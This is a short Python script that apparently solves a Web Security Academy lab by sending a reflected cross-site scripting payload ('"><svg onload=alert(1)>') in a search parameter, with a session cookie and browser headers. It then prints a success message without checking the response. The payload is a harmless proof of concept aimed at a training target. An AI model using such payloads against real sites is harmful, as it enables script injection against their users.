import requests

url = "https://0aa10068031d2c2d80293085001600ef.web-security-academy.net/"
headers = {
    "Host": "0aa10068031d2c2d80293085001600ef.web-security-academy.net",
    "Cookie": "session=deCgUt3SjnzcpECyaBnTHf47wyparmGH",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://0aa10068031d2c2d80293085001600ef.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=0, i"
}
data = {
    "search" : '"><svg onload=alert(1)>'
}

response = requests.get(url=url, headers=headers, params=data).text
print("You solve the lab")